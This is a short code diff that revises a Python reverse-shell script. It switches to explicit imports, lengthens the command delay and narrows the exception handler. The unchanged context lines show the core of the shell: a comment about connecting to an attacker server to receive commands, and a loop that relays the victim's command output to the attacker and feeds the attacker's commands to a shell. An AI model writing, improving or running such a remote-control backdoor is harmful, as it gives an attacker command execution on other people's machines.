@@ -1,6 +1,6 @@
 import os
 import time
-from subprocess import *
+from subprocess import Popen, PIPE
 from socket import *
 
 # Connect to attacker server to recieve commands
@@ -15,7 +15,7 @@ try:
   while True:
 
     # Delay waits for command prompt to finish executing command
-    time.sleep(0.2)
+    time.sleep(0.5)
 
     # Send any output/response to attacker
     output = os.read(cmd.stdout.fileno(), 2048)
@@ -27,7 +27,7 @@ try:
     if command != '\n':
       os.write(cmd.stdin.fileno(), command)
 
-except:
+except ConnectionError:
   print('Terminating reverse shell!')
 
 finally:
